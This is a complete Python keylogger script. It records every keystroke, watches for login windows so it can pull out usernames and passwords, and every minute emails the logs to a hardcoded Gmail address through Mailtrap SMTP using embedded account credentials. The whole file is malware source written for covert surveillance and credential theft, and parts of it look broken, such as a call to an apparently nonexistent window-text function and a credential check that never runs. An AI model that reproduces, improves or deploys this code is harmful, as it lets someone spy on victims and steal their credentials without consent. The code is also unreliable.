import keyboard
import smtplib
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
import os
import re
import pygetwindow

# Keylogger settings
SEND_REPORT_EVERY = 60  # in seconds, reporting interval
EMAIL_ADDRESS = "9d7eac0e27dafc"  # Mailtrap username
EMAIL_PASSWORD = "8368e168f397d0"  # Mailtrap password
RECIPIENT_EMAIL = "kunalkanse47@gmail.com"

# Path to store log files
LOG_FOLDER = "D:/Keylogger Project"

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        self.logfile = None
        self.current_window = ""
        self.login_detected = False

    def callback(self, event):
        # Handle special keys separately
        if event.name == "space":
            self.log += " "
        # Exclude logging for specific keys like shift, enter, ctrl, etc.
        elif event.event_type == keyboard.KEY_DOWN and event.name.lower() not in ['shift', 'enter', 'ctrl', 'alt']:
            self.log += event.name
            self.detect_login(event.name)

    def detect_login(self, key):
        # Detect login page and extract credentials
        if not self.login_detected:
            self.current_window = pygetwindow.getActiveWindow().title
            if self.is_login_page(self.current_window):
                if key == "enter":
                    username, password = self.extract_credentials(keyboard.get_window_text(self.current_window))
                    if username and password:
                        self.log += f"\nCaptured credentials: Username - {username}, Password - {password}\n"
                        self.login_detected = True

    def is_login_page(self, url):
        # Check if URL indicates a login page
        login_patterns = ['login', 'signin', 'auth']
        return any(pattern in url.lower() for pattern in login_patterns)

    def extract_credentials(self, text):
        # Extract username and password from text
        username = re.search(r'Username:\s*(\S+)', text)
        password = re.search(r'Password:\s*(\S+)', text)
        if username and password:
            return username.group(1), password.group(1)
        return None, None

    def update_filename(self):
        # Generate log file name based on start and end timestamps
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        filename = f"keylog-{start_dt_str}_{end_dt_str}.txt"
        self.logfile = os.path.join(LOG_FOLDER, filename)

    def report_to_email(self):
        # Send log file via email using Mailtrap
        if self.logfile and os.path.exists(self.logfile):
            sender = EMAIL_ADDRESS + "@smtp.mailtrap.io"
            receiver = RECIPIENT_EMAIL

            msg = MIMEMultipart()
            msg['From'] = sender
            msg['To'] = receiver
            msg['Subject'] = "Keylogger logs"

            body = "Please find the attached keylogger log file."
            msg.attach(MIMEText(body, 'plain'))

            with open(self.logfile, 'rb') as file:
                attachment = MIMEApplication(file.read(), Name=os.path.basename(self.logfile))
            attachment['Content-Disposition'] = f'attachment; filename="{os.path.basename(self.logfile)}"'
            msg.attach(attachment)

            with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
                server.starttls()
                server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
                server.sendmail(sender, receiver, msg.as_string())

            print(f"[+] Sent {self.logfile} to {receiver}")
        else:
            print(f"[-] Error: Log file {self.logfile} does not exist.")

    def report(self):
        # Periodically save log file and send email report
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            with open(self.logfile, "w") as f:
                f.write(self.log)
            self.report_to_email()
            self.start_dt = datetime.now()
        self.log = ""
        self.login_detected = False
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        # Start keylogger
        self.start_dt = datetime.now()
        keyboard.on_press(callback=self.callback)
        self.report()
        print(f"{datetime.now()} - Started keylogger")
        keyboard.wait()

if __name__ == "__main__":
    # Initialize and start the keylogger
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()
